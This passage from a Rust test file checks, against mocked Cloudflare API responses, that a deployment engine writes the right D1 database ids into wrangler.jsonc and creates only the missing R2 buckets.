                body: r#"{"success":true,"result":{}}"#,
            },
        ])
        .await;
        engine.cf_base = base;
        let target = DeploymentTarget {
            id: "t".to_string(),
            provider: DeploymentProvider::Worker,
            vault: "cf".to_string(),
            account_id: "0123456789abcdef0123456789abcdef".to_string(),
            project: "w".to_string(),
            project_dir: proj.to_string_lossy().to_string(),
            build_command: "npm run build".to_string(),
            output_dir: ".".to_string(),
            branch: None,
            worker_package_deploy: true,
            created_at: "2026-01-01T00:00:00.000Z".to_string(),
        };
        engine
            .bootstrap_target_storage(&target, Some(&agent_ctx()))
            .await
            .unwrap();
        let cfg = std::fs::read_to_string(proj.join("wrangler.jsonc")).unwrap();
        assert!(cfg.contains("\"database_id\": \"uuid-have\""), "{cfg}");
        assert!(cfg.contains("\"database_id\": \"uuid-new\""), "{cfg}");
        assert!(!cfg.contains("stale-id"), "{cfg}");
        let reqs = reqs.lock().unwrap();
        let posts: Vec<&CapturedRequest> = reqs.iter().filter(|r| r.method == "POST").collect();
        // 1 D1 create + 2 R2 creates (need-bucket, need-preview).
        assert_eq!(posts.len(), 3, "{reqs:?}");
        assert!(posts
            .iter()
            .any(|r| r.path.contains("/d1/database") && r.body.contains("need-db")));
        assert!(posts
            .iter()
            .any(|r| r.path.contains("/r2/buckets") && r.body.contains("need-bucket")));
        assert!(posts
            .iter()
            .any(|r| r.path.contains("/r2/buckets") && r.body.contains("need-preview")));
        assert!(!posts.iter().any(|r| r.body.contains("remote-bucket")));
        assert!(!posts.iter().any(|r| r.body.contains("have-bucket")));
        let _ = std::fs::remove_dir_all(&proj);
    }
}
